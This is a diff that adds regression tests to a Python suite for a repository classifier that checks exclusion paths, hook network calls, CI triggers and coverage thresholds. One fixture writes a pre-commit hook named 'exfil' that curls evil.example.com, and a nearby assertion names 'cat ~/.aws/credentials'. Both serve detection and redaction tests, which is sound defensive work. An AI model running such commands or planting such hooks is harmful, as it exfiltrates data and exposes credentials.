@@ -289,6 +289,14 @@ class ExclusionTestCase(unittest.TestCase):
         self.assertEqual(self.flowctl._prime_exclusion_category("tests/fixtures/x.json"), "fixtures")
         self.assertEqual(self.flowctl._prime_exclusion_category("plans/roadmap.md"), "agent-state")
 
+    def test_nested_history_and_plans_are_domain_code(self) -> None:
+        # Regression (PR #207 round 7): agent-state exclusion is ROOT-level
+        # only - src/history/ and app/plans/ are application code.
+        self.assertIsNone(self.flowctl._prime_exclusion_category("src/history/service.py"))
+        self.assertIsNone(self.flowctl._prime_exclusion_category("app/plans/pricing.ts"))
+        self.assertEqual(self.flowctl._prime_exclusion_category("history/2026-01.md"), "agent-state")
+        self.assertEqual(self.flowctl._prime_exclusion_category("_plans/spec.md"), "agent-state")
+
     def test_source_not_excluded(self) -> None:
         self.assertIsNone(self.flowctl._prime_exclusion_category("src/app/main.py"))
 
@@ -1069,6 +1077,37 @@ class SubstanceRedactionTestCase(_SubstanceBase):
         self.assertNotIn(secret_url, blob)
         self.assertNotIn("cat ~/.aws/credentials", blob)
 
+    def test_precommit_repo_urls_are_not_network_calls(self) -> None:
+        # Regression (PR #207 round 7, P1): `repo: https://github.com/...` is
+        # pre-commit METADATA, not an executing hook command - it must not trip
+        # network_call into a false P0. An executable curl in the SAME file
+        # still counts.
+        _write(
+            self.repo, ".pre-commit-config.yaml",
+            "repos:\n"
+            "  - repo: https://github.com/pre-commit/pre-commit-hooks\n"
+            "    rev: v4.6.0\n"
+            "    hooks:\n"
+            "      - id: trailing-whitespace\n",
+        )
+        hooks = self._classify()["substance"]["hooks"]["hooks"]
+        pc = next(h for h in hooks if h["source"].endswith(".pre-commit-config.yaml"))
+        self.assertFalse(pc["content_classes"]["network_call"])
+
+    def test_precommit_executable_network_call_still_flagged(self) -> None:
+        _write(
+            self.repo, ".pre-commit-config.yaml",
+            "repos:\n"
+            "  - repo: local\n"
+            "    hooks:\n"
+            "      - id: exfil\n"
+            "        entry: curl https://evil.example.com/x\n"
+            "        language: system\n",
+        )
+        hooks = self._classify()["substance"]["hooks"]["hooks"]
+        pc = next(h for h in hooks if h["source"].endswith(".pre-commit-config.yaml"))
+        self.assertTrue(pc["content_classes"]["network_call"])
+
     def test_env_payload_carries_names_never_values(self) -> None:
         _write(self.repo, ".env.example", "DB_PASSWORD=hunter2-not-a-real-secret\n")
         _write(self.repo, "app.py", "import os\nos.environ['DB_PASSWORD']\n")
@@ -1284,6 +1323,22 @@ class SubstanceCiSecretsApiTestCase(_SubstanceBase):
         ci = self._classify()["substance"]["ci_gate"]
         self.assertTrue(ci["has_gate_trigger"])
         self.assertIn("push", ci["triggers"])
+
+    def test_bitbucket_pull_requests_section_counts_as_gated(self) -> None:
+        # Regression (PR #207 round 7): a PR-only Bitbucket pipeline
+        # (`pipelines: pull-requests:`) is a valid gate-relevant trigger.
+        _write(
+            self.repo, "bitbucket-pipelines.yml",
+            "pipelines:\n"
+            "  pull-requests:\n"
+            "    '**':\n"
+            "      - step:\n"
+            "          script:\n"
+            "            - pytest\n",
+        )
+        ci = self._classify()["substance"]["ci_gate"]
+        self.assertTrue(ci["has_gate_trigger"])
+        self.assertIn("pull_request", ci["triggers"])
 
     def test_ci_test_lint_flags_require_executable_content(self) -> None:
         # Regression (PR #207): `name: test lint` and matrix values are not
@@ -1524,6 +1579,19 @@ class SubstanceLegacyRowsTestCase(_SubstanceBase):
         cov = self._classify()["substance"]["coverage_threshold"]
         self.assertTrue(cov["threshold_found"])
         self.assertFalse(cov["zero_threshold"])
+
+    def test_jest_unquoted_zero_threshold_detected(self) -> None:
+        # Regression (PR #207 round 7): bare JS object keys (`lines: 0`) are
+        # the common Jest/Vitest form and must parse like quoted keys.
+        _write(
+            self.repo, "jest.config.js",
+            "module.exports = {\n"
+            "  coverageThreshold: { global: { lines: 0, branches: 0 } },\n"
+            "};\n",
+        )
+        cov = self._classify()["substance"]["coverage_threshold"]
+        self.assertTrue(cov["threshold_found"])
+        self.assertTrue(cov["zero_threshold"])
 
     def test_setup_stages_install_and_migrate(self) -> None:
         _write(self.repo, "setup.sh", "#!/bin/sh\nnpm ci\nnpx prisma migrate deploy\n")
